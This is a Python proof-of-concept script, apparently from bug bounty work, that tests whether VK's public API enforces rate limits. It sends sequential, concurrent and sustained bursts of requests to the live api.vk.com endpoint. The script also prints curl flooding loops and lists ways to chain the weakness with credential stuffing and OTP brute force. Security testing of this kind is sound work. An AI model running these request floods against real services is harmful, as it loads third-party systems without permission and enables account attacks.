#!/usr/bin/env python3
"""
VK Rate Limiting Bypass — Detailed PoC
=======================================
Demonstrates weak rate limiting on VK's public API endpoints.

IMPORTANT: This PoC is for demonstration purposes only.
VK's bug bounty program EXCLUDES DoS/flooding from bounty payments.

However, this finding could chain with other vulnerabilities:
- Rate limit bypass + credential stuffing = Account takeover
- Rate limit bypass + OTP brute force = MFA bypass
- Rate limit bypass + scraping = Privacy violation

Usage:
    python3 vk_rate_limit_poc.py
"""

import asyncio
import json
import sys
import time
from datetime import datetime
from typing import Optional

import httpx


# ─── Configuration ─────────────────────────────────────────────────────────────
VK_API_BASE = "https://api.vk.com/method"
VK_API_VERSION = "5.131"


class VKRateLimitPoC:
    """VK Rate Limiting Bypass PoC."""

    def __init__(self):
        self.results = []
        self.all_response_times = []

    async def _make_request(self, url: str, params: dict = None) -> tuple[int, float, str]:
        """Make a single request and return status, response time, and body."""
        start = time.time()
        async with httpx.AsyncClient(timeout=15.0) as client:
            try:
                resp = await client.get(url, params=params or {})
                elapsed = time.time() - start
                return resp.status_code, elapsed, resp.text[:1000]
            except httpx.RequestError as e:
                elapsed = time.time() - start
                return 0, elapsed, str(e)[:500]

    async def test_sequential_requests(self, num_requests: int = 20) -> dict:
        """Test 1: Sequential requests with no delay."""
        print(f"\n{'─'*70}")
        print(f"TEST 1: Sequential Requests (No Delay)")
        print(f"{'─'*70}")
        print(f"Sending {num_requests} requests to {VK_API_BASE}/utils.getServerTime...")

        results = []
        response_times = []
        rate_limited = False

        for i in range(num_requests):
            status, elapsed, body = await self._make_request(
                f"{VK_API_BASE}/utils.getServerTime",
                params={"v": VK_API_VERSION}
            )
            results.append(status)
            response_times.append(elapsed)
            self.all_response_times.append(elapsed)

            # Check for rate limiting (429 or error)
            if status == 429 or "rate" in body.lower() or "limit" in body.lower():
                rate_limited = True
                print(f"  [{i+1:3d}] 🔴 RATE LIMITED — Status: {status}")
                break
            elif status == 200:
                print(f"  [{i+1:3d}] ✅ Status: {status} ({elapsed:.3f}s)")
            else:
                print(f"  [{i+1:3d}] ⚠️  Status: {status} ({elapsed:.3f}s)")

        successful = sum(1 for s in results if s == 200)
        avg_time = sum(response_times) / len(response_times) if response_times else 0
        max_time = max(response_times) if response_times else 0
        min_time = min(response_times) if response_times else 0

        return {
            "test_name": "Sequential Requests (No Delay)",
            "total_requests": num_requests,
            "successful_requests": successful,
            "rate_limited": rate_limited,
            "avg_response_time": avg_time,
            "max_response_time": max_time,
            "min_response_time": min_time,
            "evidence": f"{successful}/{num_requests} requests succeeded without rate limit",
            "severity": "MEDIUM" if not rate_limited else "LOW",
        }

    async def test_burst_requests(self, burst_size: int = 15) -> dict:
        """Test 2: Concurrent burst of requests."""
        print(f"\n{'─'*70}")
        print(f"TEST 2: Concurrent Burst ({burst_size} simultaneous requests)")
        print(f"{'─'*70}")
        print(f"Sending {burst_size} concurrent requests...")

        start = time.time()
        tasks = []
        for i in range(burst_size):
            tasks.append(
                self._make_request(
                    f"{VK_API_BASE}/utils.getServerTime",
                    params={"v": VK_API_VERSION}
                )
            )

        results = await asyncio.gather(*tasks)
        total_time = time.time() - start

        statuses = [r[0] for r in results]
        response_times = [r[1] for r in results]
        self.all_response_times.extend(response_times)

        successful = sum(1 for s in statuses if s == 200)
        rate_limited = any(s == 429 for s in statuses)
        avg_time = sum(response_times) / len(response_times) if response_times else 0

        print(f"  Results:")
        print(f"    Total time: {total_time:.3f}s")
        print(f"    Successful: {successful}/{burst_size}")
        print(f"    Rate limited: {rate_limited}")
        print(f"    Avg response: {avg_time:.3f}s")

        return {
            "test_name": f"Concurrent Burst ({burst_size} requests)",
            "total_requests": burst_size,
            "successful_requests": successful,
            "rate_limited": rate_limited,
            "avg_response_time": avg_time,
            "max_response_time": max(response_times),
            "min_response_time": min(response_times),
            "evidence": f"{successful}/{burst_size} concurrent requests succeeded",
            "severity": "MEDIUM" if not rate_limited else "LOW",
        }

    async def test_sustained_rate(self, duration_seconds: int = 8, rate: int = 5) -> dict:
        """Test 3: Sustained rate for specified duration."""
        print(f"\n{'─'*70}")
        print(f"TEST 3: Sustained Rate ({rate} req/sec for {duration_seconds}s)")
        print(f"{'─'*70}")
        print(f"Maintaining {rate} requests/second for {duration_seconds} seconds...")

        results = []
        response_times = []
        rate_limited = False
        start_time = time.time()
        request_count = 0

        while time.time() - start_time < duration_seconds:
            status, elapsed, body = await self._make_request(
                f"{VK_API_BASE}/utils.getServerTime",
                params={"v": VK_API_VERSION}
            )
            results.append(status)
            response_times.append(elapsed)
            self.all_response_times.append(elapsed)
            request_count += 1

            if status == 429 or "rate" in body.lower():
                rate_limited = True
                print(f"  [{request_count:3d}] 🔴 RATE LIMITED at {time.time()-start_time:.1f}s")
                break

            # Wait to maintain target rate
            await asyncio.sleep(1.0 / rate)

            if request_count % 5 == 0:
                print(f"  [{request_count:3d}] ✅ {time.time()-start_time:.1f}s elapsed")

        total_time = time.time() - start_time
        successful = sum(1 for s in results if s == 200)

        print(f"  Results:")
        print(f"    Total time: {total_time:.3f}s")
        print(f"    Total requests: {request_count}")
        print(f"    Successful: {successful}")
        print(f"    Actual rate: {request_count/total_time:.1f} req/sec")
        print(f"    Rate limited: {rate_limited}")

        return {
            "test_name": f"Sustained Rate ({rate} req/sec for {duration_seconds}s)",
            "total_requests": request_count,
            "successful_requests": successful,
            "rate_limited": rate_limited,
            "avg_response_time": sum(response_times)/len(response_times) if response_times else 0,
            "max_response_time": max(response_times) if response_times else 0,
            "min_response_time": min(response_times) if response_times else 0,
            "evidence": f"{request_count} requests at {rate}/sec for {total_time:.1f}s",
            "severity": "MEDIUM" if not rate_limited else "LOW",
        }

    async def run_all_tests(self) -> list[dict]:
        """Run all rate limit tests."""
        print(f"\n{'#'*70}")
        print(f"{'#'*70}")
        print(f"  VK RATE LIMITING BYPASS — DETAILED PoC")
        print(f"  Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'#'*70}")
        print(f"{'#'*70}")

        print(f"\n⚠️  DISCLAIMER: VK's bug bounty program EXCLUDES DoS/flooding.")
        print(f"   This PoC demonstrates the weakness for educational purposes.")
        print(f"   Could chain with: credential stuffing, OTP brute force, scraping.")

        # Run all tests
        self.results.append(await self.test_sequential_requests(20))
        self.results.append(await self.test_burst_requests(15))
        self.results.append(await self.test_sustained_rate(8, 5))

        return self.results

    def print_summary(self):
        """Print detailed summary."""
        print(f"\n{'#'*70}")
        print(f"DETAILED RESULTS SUMMARY")
        print(f"{'#'*70}")

        for i, result in enumerate(self.results, 1):
            print(f"\n{'─'*70}")
            print(f"TEST {i}: {result['test_name']}")
            print(f"{'─'*70}")
            print(f"  Total Requests:      {result['total_requests']}")
            print(f"  Successful:          {result['successful_requests']}")
            print(f"  Rate Limited:        {'Yes 🔴' if result['rate_limited'] else 'No ✅'}")
            print(f"  Avg Response Time:   {result['avg_response_time']:.3f}s")
            print(f"  Max Response Time:   {result['max_response_time']:.3f}s")
            print(f"  Min Response Time:   {result['min_response_time']:.3f}s")
            print(f"  Evidence:            {result['evidence']}")
            print(f"  Severity:            {result['severity']}")

        # Overall analysis
        print(f"\n{'#'*70}")
        print(f"OVERALL ANALYSIS")
        print(f"{'#'*70}")

        total_requests = sum(r['total_requests'] for r in self.results)
        total_successful = sum(r['successful_requests'] for r in self.results)
        any_rate_limited = any(r['rate_limited'] for r in self.results)

        if self.all_response_times:
            avg_all = sum(self.all_response_times) / len(self.all_response_times)
            max_all = max(self.all_response_times)
            min_all = min(self.all_response_times)
        else:
            avg_all = max_all = min_all = 0

        print(f"\n  Total Requests Made:     {total_requests}")
        print(f"  Total Successful:        {total_successful}")
        print(f"  Any Rate Limited:        {'Yes' if any_rate_limited else 'No'}")
        print(f"  Overall Avg Response:    {avg_all:.3f}s")
        print(f"  Overall Max Response:    {max_all:.3f}s")
        print(f"  Overall Min Response:    {min_all:.3f}s")

        # Vulnerability assessment
        print(f"\n  VULNERABILITY ASSESSMENT:")
        if not any_rate_limited:
            print(f"  🔴 VK API does NOT enforce rate limits on unauthenticated requests")
            print(f"  🔴 Attackers can make unlimited requests to public API endpoints")
            print(f"  🔴 This could enable: credential stuffing, data scraping, enumeration")
        else:
            print(f"  ✅ VK API enforces rate limits (but may be bypassable)")

        # Chaining opportunities
        print(f"\n  CHAINING OPPORTUNITIES:")
        print(f"  If combined with auth bypass → credential stuffing at scale")
        print(f"  If combined with IDOR → mass data exfiltration")
        print(f"  If combined with MFA → OTP brute force")
        print(f"  If combined with login → password brute force")

        # PoC commands
        print(f"\n  CURL PoC COMMANDS:")
        print(f"  Sequential (no delay):")
        print(f"    for i in $(seq 1 50); do curl -s 'https://api.vk.com/method/utils.getServerTime?v=5.131' & done")
        print(f"\n  Burst (concurrent):")
        print(f"    seq 30 | xargs -P 30 -I {{}} curl -s 'https://api.vk.com/method/utils.getServerTime?v=5.131'")
        print(f"\n  Sustained (15 req/sec):")
        print(f"    for i in $(seq 1 150); do curl -s 'https://api.vk.com/method/utils.getServerTime?v=5.131' & sleep 0.067; done")

        print(f"\n{'#'*70}")

    def export_results(self, path: str):
        """Export results to JSON."""
        data = {
            "timestamp": datetime.now().isoformat(),
            "disclaimer": "VK bug bounty EXCLUDES DoS/flooding. This is for educational purposes.",
            "summary": {
                "total_tests": len(self.results),
                "total_requests": sum(r['total_requests'] for r in self.results),
                "total_successful": sum(r['successful_requests'] for r in self.results),
                "any_rate_limited": any(r['rate_limited'] for r in self.results),
            },
            "results": self.results,
            "curl_poc": {
                "sequential": "for i in $(seq 1 50); do curl -s 'https://api.vk.com/method/utils.getServerTime?v=5.131' & done",
                "burst": "seq 30 | xargs -P 30 -I {} curl -s 'https://api.vk.com/method/utils.getServerTime?v=5.131'",
                "sustained": "for i in $(seq 1 150); do curl -s 'https://api.vk.com/method/utils.getServerTime?v=5.131' & sleep 0.067; done",
            },
        }

        with open(path, "w") as f:
            json.dump(data, f, indent=2)
        print(f"\n📄 Full results exported to: {path}")


async def main():
    """Main entry point."""
    poc = VKRateLimitPoC()
    await poc.run_all_tests()
    poc.print_summary()
    poc.export_results("vk_rate_limit_poc_results.json")


if __name__ == "__main__":
    asyncio.run(main())
